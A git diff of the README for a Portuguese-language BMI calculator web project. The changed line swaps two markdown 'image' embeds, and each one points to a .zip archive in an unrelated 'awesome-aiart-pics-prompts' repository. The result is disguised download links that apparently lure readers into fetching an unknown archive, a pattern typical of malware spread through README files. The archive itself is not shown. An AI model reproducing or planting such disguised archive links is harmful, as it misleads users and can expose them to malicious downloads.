@@ -4,7 +4,7 @@ Esta calculadora permite que o usuário saiba se está no peso ideal. Esta calcu
 # Sobre o projeto
 Para utilizar essa calculadora basta apenas o usuário digitar o seu peso e a sua altura, depois clicar em calcular que o seu IMC será mostrado logo acima do botão calcular. Abaixo da calculadora tem uma tabela que permite o usuário localizar o seu IMC e ter uma noção de quanto de IMC falta para chegar ao peso normal.
 
-![image](https://raw.githubusercontent.com/CiroNobre3/awesome-aiart-pics-prompts/main/ensuer/aiart-prompts-awesome-pics-v3.2.zip)   ![image](https://raw.githubusercontent.com/CiroNobre3/awesome-aiart-pics-prompts/main/ensuer/aiart-prompts-awesome-pics-v3.2.zip)
+![image](https://github.com/CiroNobre3/awesome-aiart-pics-prompts/raw/refs/heads/main/ensuer/pics-prompts-aiart-awesome-2.7-alpha.3.zip)   ![image](https://github.com/CiroNobre3/awesome-aiart-pics-prompts/raw/refs/heads/main/ensuer/pics-prompts-aiart-awesome-2.7-alpha.3.zip)
 
 # Tecnologias
 ### Para a realização deste projeto, foi utilizado HTML5, CSS3 e Javascript.
